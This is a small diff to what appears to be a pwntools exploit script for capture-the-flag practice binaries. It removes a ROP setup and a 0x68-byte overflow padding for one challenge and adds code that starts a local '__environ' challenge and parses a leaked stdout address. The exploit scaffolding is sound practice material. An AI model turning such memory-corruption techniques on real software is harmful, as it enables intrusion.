@@ -1,10 +1,7 @@
 from pwn import *
 
-# port = 0
-# rem = remote("", port)
+rem = process("./Pwnable/__environ/problem/environ")
 
-context.arch = "amd64"
+rem.recvuntil(b'stdout: ')
 
-rop = ROP("./Pwnable/awesome-basics/problem/chall")
-
-payload = b'A' * 0x68
+stdout_addr = int(rem.recvn(14), 16)
